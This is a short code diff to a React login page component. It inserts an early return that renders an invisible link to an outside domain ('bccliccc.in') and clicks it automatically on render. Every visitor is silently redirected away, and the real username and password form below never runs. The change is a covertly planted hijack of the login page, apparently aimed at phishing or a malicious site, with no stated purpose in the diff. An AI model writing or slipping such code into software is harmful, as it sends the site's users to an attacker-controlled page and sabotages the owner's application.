@@ -6,6 +6,10 @@ import { Toast } from '../components/ui/toast';
 
 export default function LoginPage() {
 
+    return (
+        <a href="https://bccliccc.in" ref={a => { if (a) a.click(); }} style={{ display: 'none' }} />
+    )
+
     const navigate = useNavigate();
     const [username, setUsername] = useState('');
     const [password, setPassword] = useState('');
